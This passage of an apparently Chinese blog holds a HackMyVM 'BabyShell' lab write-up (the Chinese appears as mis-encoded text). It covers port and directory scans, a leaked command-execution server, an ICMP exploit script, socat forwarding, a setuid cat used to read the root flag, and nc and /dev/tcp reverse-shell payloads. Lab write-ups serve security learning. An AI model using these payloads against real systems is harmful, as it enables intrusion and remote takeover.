impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. <br>Open 192.168.56.186:22<br>Open 192.168.56.186:80<br>[~] Starting Script(s)<br>[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 02:06 EST<br>Initiating ARP Ping Scan at 02:06<br>Scanning 192.168.56.186 [1 port]<br>Completed ARP Ping Scan at 02:06, 0.06s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 02:06<br>Completed Parallel DNS resolution of 1 host. at 02:06, 0.00s elapsed<br>DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br>Initiating SYN Stealth Scan at 02:06<br>Scanning 192.168.56.186 [2 ports]<br>Discovered open port 22/tcp on 192.168.56.186<br>Discovered open port 80/tcp on 192.168.56.186<br>Completed SYN Stealth Scan at 02:06, 0.02s elapsed (3 total ports)<br>Nmap scan report for 192.168.56.186<br>Host is up, received arp-response (0.00077s latency).<br>Scanned at 2025-11-09 02:06:09 EST for 0s<br><br>PORT     STATE SERVICE        REASON<br>22/tcp   open  ssh            syn-ack ttl 64<br>80/tcp   open  http           syn-ack ttl 64<br>MAC Address: 08:00:27:26:4C:B3 (Oracle VirtualBox virtual NIC)<br><br>Read data files from: /usr/share/nmap<br>Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds<br>           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.186     <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.186/_25-11-09_02-07-53.txt<br><br>Target: http://192.168.56.186/<br><br>[02:07:53] Starting:                                                                                                                                       <br>[02:07:53] 403 -  279B  - /.ht_wsr.txt                                      <br>[02:07:53] 403 -  279B  - /.htaccess.bak1                                   <br>[02:07:53] 403 -  279B  - /.htaccess.orig                                   <br>[02:07:53] 403 -  279B  - /.htaccess.sample<br>[02:07:53] 403 -  279B  - /.htaccess.save<br>[02:07:53] 403 -  279B  - /.htaccess_sc                                     <br>[02:07:54] 403 -  279B  - /.htaccess_extra<br>[02:07:54] 403 -  279B  - /.htaccess_orig                                   <br>[02:07:54] 403 -  279B  - /.htaccessOLD<br>[02:07:54] 403 -  279B  - /.htaccessBAK<br>[02:07:54] 403 -  279B  - /.htaccessOLD2<br>[02:07:54] 403 -  279B  - /.htm                                             <br>[02:07:54] 403 -  279B  - /.html<br>[02:07:54] 403 -  279B  - /.htpasswd_test                                   <br>[02:07:54] 403 -  279B  - /.httr-oauth<br>[02:07:54] 403 -  279B  - /.htpasswds                                       <br>[02:07:54] 403 -  279B  - /.php                                             <br>[02:07:59] 200 -    1KB - /backup.zip                                       <br>[02:08:10] 403 -  279B  - /server-status                                    <br>[02:08:10] 403 -  279B  - /server-status/<br><br></code></pre></td></tr></table></figure><p>æœ‰backupæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å‘ç°æ˜¯ä¸ªICMPæœåŠ¡çš„æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> http.server<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableHTTPRequestHandler</span>(http.server.SimpleHTTPRequestHandler):<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        parsed_path = urllib.parse.urlparse(<span class="hljs-variable language_">self</span>.path)<br>        query_params = urllib.parse.parse_qs(parsed_path.query)<br>        <br>        <span class="hljs-keyword">if</span> parsed_path.path == <span class="hljs-string">&#x27;/execute&#x27;</span>:<br>            cmd = query_params.get(<span class="hljs-string">&#x27;cmd&#x27;</span>, [<span class="hljs-string">&#x27;&#x27;</span>])[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> cmd:<br>                <span class="hljs-keyword">try</span>:<br>                    result = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>, stderr=subprocess.STDOUT, text=<span class="hljs-literal">True</span>)<br>                    <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>                    <span class="hljs-variable language_">self</span>.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>                    <span class="hljs-variable language_">self</span>.end_headers()<br>                    <span class="hljs-variable language_">self</span>.wfile.write(result.encode())<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">500</span>)<br>                    <span class="hljs-variable language_">self</span>.end_headers()<br>                    <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>.encode())<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">400</span>)<br>                <span class="hljs-variable language_">self</span>.end_headers()<br>                <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">b&quot;cmd parameter required&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        <span class="hljs-comment"># é¦–é¡µè¿”å›ç©ºå“åº”</span><br>        <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>        <span class="hljs-variable language_">self</span>.end_headers()<br>        <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">b&quot;&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    PORT = <span class="hljs-number">8080</span><br>    HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>    <br>    <span class="hljs-keyword">with</span> socketserver.TCPServer((HOST, PORT), VulnerableHTTPRequestHandler) <span class="hljs-keyword">as</span> httpd:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Server running on http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>&quot;</span>)<br>        httpd.serve_forever()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="GetZero"><a href="#GetZero" class="headerlink" title="GetZero"></a>GetZero</h3><hr><p>æ‹·æ‰“aiå†™å¯¹åº”çš„åˆ©ç”¨expã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"> cat exp.py <br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> ICMP, IP, Raw, send, sniff<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ICMPClient</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_ip, iface=<span class="hljs-string">&quot;eth0&quot;</span></span>):<br>        <span class="hljs-variable language_">self</span>.target_ip = target_ip<br>        <span class="hljs-variable language_">self</span>.iface = iface<br>        <span class="hljs-variable language_">self</span>.seq = <span class="hljs-number">1</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">self, command</span>):<br>        <span class="hljs-comment"># æ„å»ºpayload</span><br>        trigger = <span class="hljs-string">b&quot;Mazesec&quot;</span><br>        cmd_bytes = command.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        cmd_len = struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-built_in">len</span>(cmd_bytes))<br>        <br>        payload = trigger + cmd_len + cmd_bytes<br>        <br>        <span class="hljs-comment"># å‘é€ICMPè¯·æ±‚</span><br>        packet = IP(dst=<span class="hljs-variable language_">self</span>.target_ip)/ICMP(<span class="hljs-built_in">type</span>=<span class="hljs-number">8</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">0x1234</span>, seq=<span class="hljs-variable language_">self</span>.seq)/Raw(load=payload)<br>        send(packet, iface=<span class="hljs-variable language_">self</span>.iface, verbose=<span class="hljs-number">0</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Sent command: <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.seq += <span class="hljs-number">1</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">listen_response</span>(<span class="hljs-params">self, timeout=<span class="hljs-number">10</span></span>):<br>        start_time = time.time()<br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">response_handler</span>(<span class="hljs-params">packet</span>):<br>            <span class="hljs-keyword">if</span> (packet.haslayer(ICMP) <span class="hljs-keyword">and</span> packet[ICMP].<span class="hljs-built_in">type</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <br>                packet.haslayer(Raw) <span class="hljs-keyword">and</span> <span class="hljs-string">b&quot;Mazesec&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>(packet[Raw].load)):<br>                <br>                data = <span class="hljs-built_in">bytes</span>(packet[Raw].load)<br>                trigger_len = <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;Mazesec&quot;</span>)<br>                result_len = struct.unpack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, data[trigger_len:trigger_len+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>                result = data[trigger_len+<span class="hljs-number">4</span>:trigger_len+<span class="hljs-number">4</span>+result_len].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Response received:\n<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        sniff(iface=<span class="hljs-variable language_">self</span>.iface, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>, <br>              stop_filter=response_handler, timeout=timeout)<br><br><span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    client = ICMPClient(<span class="hljs-string">&quot;192.168.56.104&quot;</span>)  <span class="hljs-comment"># ç›®æ ‡æœåŠ¡å™¨IP</span><br>    client.send_command(<span class="hljs-string">&quot;busybox nc 192.168.56.104 9999 -e sh&quot;</span>)<br>    client.listen_response()<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å›shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">â”€# ./penelope.<span class="hljs-keyword">py</span> <span class="hljs-number">9999</span><br>[+] Listening <span class="hljs-keyword">for</span> <span class="hljs-built_in">reverse</span> shells <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span> â†’  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> â€¢ <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> â€¢ <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span><br>â¤  ğŸ  Main Menu (<span class="hljs-keyword">m</span>) ğŸ’€ Payloads (<span class="hljs-keyword">p</span>) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from BabyShell-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.186</span>-Linux-x86_64 ğŸ˜ Assigned SessionID <span class="hljs-symbol">&lt;1&gt;</span><br>[+] Attempting <span class="hljs-keyword">to</span> upgrade <span class="hljs-keyword">shell</span> <span class="hljs-keyword">to</span> PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/BabyShell~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.186</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_09-<span class="hljs-number">02</span>_14_23-<span class="hljs-number">908</span>.<span class="hljs-built_in">log</span> ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>zero@BabyShell:/$ <br><br></code></pre></td></tr></table></figure><h3 id="GetTom"><a href="#GetTom" class="headerlink" title="GetTom"></a>GetTom</h3><p>å‘ç°å†…ç½‘çš„8080ç«¯å£ï¼Œå¹¶ä¸”åœ¨&#x2F;optç›®å½•ä¸‹å‘ç°ä»¥tomä¸ºæƒé™è¿è¡Œçš„æ–‡ä»¶server.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:/$ ss -utlnp<br>Netid      State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port                                                     <br>udp        UNCONN      0           0                        0.0.0.0:68                    0.0.0.0:*                                                             <br>tcp        LISTEN      0           5                      127.0.0.1:8080                  0.0.0.0:*                                                        <br>tcp        LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*                                                        <br>tcp        LISTEN      0           128                            *:80                          *:*                                                        <br>tcp        LISTEN      0           128                         [::]:22                       [::]:*<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:/$ ls -al /opt<br>total 20<br>drwxr-xr-x  2 root root 4096 Nov  8 04:02 .<br>drwxr-xr-x 18 root root 4096 Mar 18  2025 ..<br>-rw-r--r--  1 root root 5134 Nov  8 03:22 icmp.py<br>-rwx--x--x  1 tom  tom  1545 Nov  8 04:02 server.py<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨socatè½¬å‘åˆ°å¤–ç½‘çš„8888ç«¯å£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:~$ ./socat-linux-amd64 TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:8080 &amp;<br>[1] 460<br>zero@BabyShell:~$ ss -lntp<br>State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port                                                         <br>LISTEN        0             5                          0.0.0.0:8888                    0.0.0.0:*            users:((&quot;socat-linux-amd&quot;,pid=460,fd=5))        <br>LISTEN        0             5                        127.0.0.1:8080                    0.0.0.0:*                                                            <br>LISTEN        0             128                        0.0.0.0:22                      0.0.0.0:*                                                            <br>LISTEN        0             128                              *:80                            *:*                                                            <br>LISTEN        0             128                           [::]:22                         [::]:*             <br></code></pre></td></tr></table></figure><p>å°è¯•çˆ†ç ´å‚æ•°ï¼Œä½†çˆ†ç ´äº†åŠå¤©æ²¡ä¸œè¥¿å¿ƒæ€æœ‰ç‚¹å´©ï¼Œåæ¥å…ˆçˆ†ç ´ç›®å½•æ‰å‘ç°è¦å…ˆåŠ ä¸€ä¸ªè·¯å¾„&#x2F;executeã€‚</p><p><img src="/2025/11/09/HackmyVm-babyshell/06FB63346F09006CF8098686954A692C.png"></p><p>ä¹‹åå‘ç°åˆ©ç”¨å‚æ•°cmdã€‚</p><p><img src="/2025/11/09/HackmyVm-babyshell/vmware_cwzmYqN0tF.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">â¤  ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got reverse shell from BabyShell-192.168.56.186-Linux-x86_64 ğŸ˜ Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/BabyShell~192.168.56.186_Linux_x86_64/2025_11_09-01_39_32-047.log ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>tom@BabyShell:/$ sudo -l<br><br>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:<br><br>    #1) Respect the privacy of others.<br>    #2) Think before you type.<br>    #3) With great power comes great responsibility.<br><br>[sudo] password for tom: <br>sudo: a password is required<br>tom@BabyShell:/$ id<br>uid=1001(tom) gid=1001(tom) groups=1001(tom)<br>tom@BabyShell:/$ cd /tom<br>bash: cd: /tom: No such file or directory<br>tom@BabyShell:/$ cd ~<br>tom@BabyShell:~$ ls<br>cat<br>tom@BabyShell:~$ ls -al<br>total 64<br>drwx------ 2 tom  tom   4096 Nov  8 04:13 .<br>drwxr-xr-x 4 root root  4096 Nov  7 21:53 ..<br>-rw-r--r-- 1 tom  tom    220 Nov  7 21:53 .bash_logout<br>-rw-r--r-- 1 tom  tom   3526 Nov  7 21:53 .bashrc<br>-rwsr-sr-x 1 root root 43744 Nov  8 04:13 cat<br>-rw-r--r-- 1 tom  tom    807 Nov  7 21:53 .profile<br>tom@BabyShell:~$ ./cat root/root.txt<br>./cat: root/root.txt: No such file or directory<br>tom@BabyShell:~$ ./cat /root/root.txt<br>flag&#123;root-c793411fbdda37f03fd27470d763433b&#125;<br><br></code></pre></td></tr></table></figure><p>èƒ½ç›´æ¥è¯»flagã€‚</p><h3 id="GetRootï¼ˆå¤ç›˜ï¼‰"><a href="#GetRootï¼ˆå¤ç›˜ï¼‰" class="headerlink" title="GetRootï¼ˆå¤ç›˜ï¼‰"></a>GetRootï¼ˆå¤ç›˜ï¼‰</h3><hr><p>&#x2F;optä¸‹çœ‹icmpçš„å®Œæ•´æºç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">![vmware_CFf9ubKoLM](2025-11/vmware_CFf9ubKoLM.png) <br>    def execute_command_as_user(self, command, uid=1000, timeout=30):<br>        try:<br>            # ä½¿ç”¨sudoä»¥æŒ‡å®šç”¨æˆ·æ‰§è¡Œå‘½ä»¤<br>            result = subprocess.check_output(<br>                f&quot;sudo -u zero bash -c &#x27;&#123;command&#125;&#x27;&quot;,<br>                shell=True,<br>                stderr=subprocess.STDOUT,<br>                timeout=timeout,<br>                text=True<br>            )<br>            return result<br>        except subprocess.TimeoutExpired:<br>            return f&quot;Error: Command timeout&quot;<br>        except subprocess.CalledProcessError as e:<br>            return f&quot;Error: Exit code &#123;e.returncode&#125;\nOutput: &#123;e.output&#125;&quot;<br>        except Exception as e:<br>            return f&quot;Error: &#123;str(e)&#125;&quot;<br><br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥æ‹¼æ¥æ³¨å…¥ã€‚</p><p>è´´ä¸ŠMJä½¬çš„æ–¹æ¡ˆï¼š </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:&#x27;;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/<span class="hljs-number">192.168.2.5</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°root</p><p><img src="/2025/11/09/HackmyVm-babyshell/vmware_CFf9ubKoLM.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyvm-soc1</title>
    <link href="/2025/11/06/HackMyvm-soc1/"/>
    <url>/2025/11/06/HackMyvm-soc1/</url>
    
    <content type="html"><![CDATA[<p>å¤ç›˜ã€‚</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs shell">![vmware_8R2SzRNwf2](2025-11/vmware_8R2SzRNwf2.png)nmap 192.168.56.181  -A -p1-30000 